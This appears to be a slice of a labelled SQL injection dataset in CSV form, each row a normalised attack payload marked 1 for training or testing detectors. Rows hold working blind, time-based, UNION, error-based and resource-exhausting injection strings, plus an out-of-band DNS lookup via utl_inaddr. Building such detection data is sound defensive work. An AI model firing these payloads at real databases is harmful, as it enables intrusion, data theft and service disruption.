row_index,payload_norm,label,sqli_type_hint
9180,"1' in boolean mode ) and make_set ( 8403 = 8403,8899 ) #",1,
9181,1' in boolean mode ) rlike ( select ( case when ( 1343 = 1595 ) then 1 else 0x28 end ) ) #,1,
9182,"-6599"" ) ) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",1,
9183,"1%' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( '%' = '",1,
9184,"-4025"" or 3038 = 3038",1,
9185,"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",1,
9186,"1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'jwbt' = 'jwbt",1,
9187,1' ) where 2227 = 2227,1,
9188,"1%"" ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""%"" = """,1,
9189,1 ) order by 1--,1,
9190,"1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""epxq"" like ""epxq",1,
9191,"1"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ""utlk"" like ""utlk",1,
9192,"1%' and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
9193,"1 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
9194,"1' ) ) as qcgf where 9656 = 9656 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
9195,1' ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
9196,"-1451%' ) union all select 7666,7666,7666#",1,
9197,"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1,
9198,"1'+ ( select 'qvif' where 1758 = 1758 union all select null,null,null,null,null,null,null,null#",1,
9199,"1"" ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""rkry"" like ""rkry",1,
9200,"-2007' where 9157 = 9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",1,
9201,"1 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
9202,"1%"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,
9203,-2817 ) where 1212 = 1212 or 3266 = 1102,1,
9204,"iif ( 9229 = 4158,1,1/0 )",1,
9205,"1, ( select ( case when ( 9443 = 9443 ) then sleep ( 5 ) else 9443* ( select 9443 from information_schema.character_sets ) end ) )",1,
9206,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( '%' = '",1,
9207,1' ) ) order by 1--,1,
9208,-5803 ) where 8651 = 8651 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,
9209,"1 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # mpyu",1,
